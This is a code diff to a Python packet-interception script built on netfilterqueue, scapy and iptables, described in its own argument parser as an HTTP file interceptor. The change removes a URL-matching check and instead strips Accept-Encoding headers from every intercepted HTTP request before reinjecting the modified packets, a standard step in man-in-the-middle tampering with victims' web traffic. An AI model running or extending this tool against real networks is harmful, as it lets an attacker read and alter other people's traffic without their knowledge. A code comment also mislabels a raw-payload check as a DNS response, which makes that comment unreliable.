@@ -6,6 +6,7 @@
 from netfilterqueue import NetfilterQueue
 import argparse
 import subprocess
+import re
 import scapy.all as scapy
 
 
@@ -24,9 +25,10 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):  # DNS response
         if scapy_packet[scapy.TCP].dport == 80:
-            if url_file.encode() in scapy_packet[scapy.Raw].load:
-                print("[+] HTTP Request")
-                print(scapy_packet.show())
+            print("[+] HTTP Request")
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
             print(scapy_packet.show())
@@ -65,11 +67,11 @@ def chain_setting(chain_iptables_to_set, remove):
 arguments = argparse.ArgumentParser(description="Intercepting file - HTTP only")
 # arguments.add_argument('-f', '--file-type', dest='file_type', help='String which is the type of the file.')
 arguments.add_argument('-c', '--iptables-chain', dest='chain_iptables', help='IPTABLES as forward or localhost')
-arguments.add_argument('-url', '--url-file', dest='url_file', help='The url to swap the file requested for the other')
+# arguments.add_argument('-url', '--url-file', dest='url_file', help='The url to swap the file requested for the other')
 
 # file_type = arguments.parse_args().file_type
 chain_iptables = arguments.parse_args().chain_iptables
-url_file = arguments.parse_args().url_file
+# url_file = arguments.parse_args().url_file
 
 
 netQueue = NetfilterQueue()
